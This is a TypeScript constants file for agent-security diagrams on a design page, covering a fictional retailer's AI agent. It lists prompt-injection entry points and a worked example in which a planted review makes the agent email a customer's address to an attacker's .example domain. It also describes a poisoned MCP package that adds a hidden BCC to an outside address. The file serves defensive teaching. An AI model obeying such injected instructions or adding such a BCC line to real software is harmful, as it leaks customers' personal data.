// Constants for the agent security figures (assets/diagrams/animated/agents/threat-model, least-privilege,
// sandbox-layers, tool-supply-chain) on genai-system-design/agent-security-and-sandboxing. Brightpost names come from
// ./agents, the three MCP servers from ./agents-tools and the third-party parcel tracker from ./agents-mcp (the same
// server the tool-poisoning figure draws); this file adds only what the security page needs. Attacker addresses use
// the reserved .example domain (RFC 2606).

import { BRIGHTPOST, TOOLS } from "./agents";

/**
 * The five places an outsider can put text or take a secret in the Brightpost agent (threat-model figure), in the
 * order the stepper adds them. Each `label` fits a 170-wide card with an icon; `sub` names the concrete case.
 */
export const ENTRY_POINTS = {
  message: { label: "Pasted note", sub: `"…refund ${BRIGHTPOST.injectedOrder} too"` },
  retrieved: { label: "Planted review", sub: "on a product page" },
  toolResult: { label: "Courier's note", sub: "free text in the order" },
  description: { label: "Tool description", sub: "hidden instructions" },
  credential: { label: "Leaked API key", sub: "copied from a log" },
} as const;

/** The exfiltration attempt in the worked example: a review asks the model to email the customer's address out. */
export const EXFIL = {
  attacker: "returns-desk@parcel-help.example",
  injected: `${TOOLS.sendEmail.name}("returns-desk@…", "Address")`,
} as const;

/**
 * One broad credential against one scoped, short-lived token per tool (least-privilege figure). The 15-minute lifetime
 * is illustrative; the scopes are Brightpost's rules: the customer is the signed-in one, refunds over £30 wait for a
 * person, email goes only to the address on file, and search_help reads public articles, so it needs no secret.
 */
export const TOKEN_TTL_MIN = 15;

export const BROAD_KEY = {
  label: "One service key",
  sub: "every customer · every action · never expires",
} as const;

export const SCOPED_TOKENS = [
  {
    tool: TOOLS.getOrder.name,
    scope: "orders:read",
    limit: `customer ${BRIGHTPOST.customerId} · ${TOKEN_TTL_MIN} min`,
  },
  {
    tool: TOOLS.createRefund.name,
    scope: "refunds:create",
    limit: `customer ${BRIGHTPOST.customerId} · over £${BRIGHTPOST.approvalLimit}: approval`,
  },
  {
    tool: TOOLS.sendEmail.name,
    scope: "email:send",
    limit: `to ${BRIGHTPOST.customerId}'s address only`,
  },
  {
    tool: TOOLS.searchHelp.name,
    scope: "no secret",
    limit: "public articles only",
  },
] as const;

/** Firecracker's published numbers (firecracker-microvm.github.io, checked 2026-11-16). */
export const FIRECRACKER = { bootMs: 125, overheadMiB: 5, devices: 5 } as const;

/**
 * Isolation strength (sandbox-layers figure), weakest to strongest. Facts checked 2026-11-16:
 * - Containers share the host kernel; a runtime bug can break out (runc CVE-2024-21626, "Leaky Vessels", disclosed
 *   31 Jan 2024, fixed in runc 1.1.12).
 * - gVisor (gvisor.dev): the Sentry, a user-space application kernel written in Go, handles every system call; "no
 *   system call is passed through directly to the host", and the Sentry itself uses a small, listed set. The runtime is
 *   `runsc` (OCI). Syscall-heavy work runs slower and not every call is implemented.
 * - Firecracker (firecracker-microvm.github.io): KVM microVMs with their own guest kernel, 5 emulated devices, a jailer
 *   as a second barrier, boot in under 125 ms, under 5 MiB of overhead per microVM; built by AWS for Lambda and Fargate
 *   (Agache et al., NSDI 2020).
 */
export const ISOLATION_LAYERS = [
  {
    id: "container",
    title: "Container",
    walls: [
      { label: "Namespaces, cgroups", sub: "host kernel features" },
      { label: "seccomp filter", sub: "host kernel feature" },
    ],
    escape: "one kernel or runtime bug",
    escapeSub: "runc CVE-2024-21626, Jan 2024",
    cost: "same kernel, least overhead",
  },
  {
    id: "gvisor",
    title: "gVisor (runsc)",
    walls: [
      { label: "Sentry", sub: "user-space kernel, in Go" },
      { label: "Few host syscalls", sub: "none passed straight through" },
    ],
    escape: "a Sentry bug, then a host bug",
    escapeSub: "two different code bases",
    cost: "slower on syscall-heavy work",
  },
  {
    id: "microvm",
    title: "microVM (Firecracker)",
    walls: [
      { label: "Guest kernel", sub: "its own Linux" },
      { label: "Firecracker + KVM", sub: `${FIRECRACKER.devices} devices, jailer behind` },
    ],
    escape: "guest, VMM, then jailer",
    escapeSub: "hardware virtualisation",
    cost: `boots < ${FIRECRACKER.bootMs} ms, < ${FIRECRACKER.overheadMiB} MiB each`,
  },
] as const;

/**
 * The supply-chain story (tool-supply-chain figure), following the postmark-mcp incident: a third-party email MCP
 * package on npm, 15 clean versions, then 1.0.16 (17 Sep 2025) added one line that BCC'd every email to an outside
 * address (Koi Security; The Hacker News, 29 Sep 2025). Brightpost's version of it: the email server is a third-party
 * package. The BCC goes out through the real mail provider, so neither the host's per-call check nor an egress
 * allow-list sees it: only pinning and reviewing the update do.
 */
export const SUPPLY_CHAIN = {
  pkg: "email-mcp",
  cleanVersions: 15,
  goodVersion: "1.0.15",
  badVersion: "1.0.16",
  badDate: "17 Sep 2025",
  added: "+ bcc: copies@mail-sync.example",
} as const;
